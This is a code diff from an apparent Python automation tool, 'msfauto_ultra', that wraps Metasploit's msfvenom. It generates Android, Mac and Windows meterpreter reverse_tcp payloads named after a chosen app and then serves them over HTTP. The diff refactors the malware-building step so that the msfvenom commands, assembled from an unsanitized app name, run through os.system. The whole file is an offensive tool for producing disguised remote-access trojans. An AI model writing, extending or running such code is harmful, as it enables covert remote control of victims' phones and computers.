@@ -5,16 +5,17 @@ import platform, os, random, time, subprocess
 init(autoreset=True)
 class msfauto_ultra():
     def __init__(self, app_name, ip, port_one, port_two, payload):
-        self.app_name = app_name.lower()
+        self.app_name = app_name
         self.ip = ip
         self.port1 = port_one
         self.port2 = port_two
         self.payload = payload
+        if self.payload == "android": self.payload = f"msfvenom -p android/meterpreter/reverse_tcp -f apk > /Output/{self.app_name}.apk"
+        elif self.payload == "mac": self.payload = f"msfvenom -p python/meterpreter/reverse_tcp > /Output/{self.app_name}.py"
+        else: self.payload = f"msfvenom -p windows/meterpreter/reverse_tcp -f exe > /Output/{self.app_name}.exe"
     def create_malware(self): 
         create_output_folder()
-        if self.payload.lower() == "android": os.system(f"msfvenom -p android/meterpreter/reverse_tcp -f apk > /Output/{self.app_name}.apk")
-        elif self.payload == "mac": os.system(f"msfvenom -p python/meterpreter/reverse_tcp > /Output/{self.app_name}.py")
-        else: os.system(f"msfvenom -p windows/meterpreter/reverse_tcp -f exe > /Output/{self.app_name}.exe")
+        os.system(self.payload)
         print(Fore.GREEN + "Malware created. continue...")
     def craete_http_server(self):
         create_output_folder()
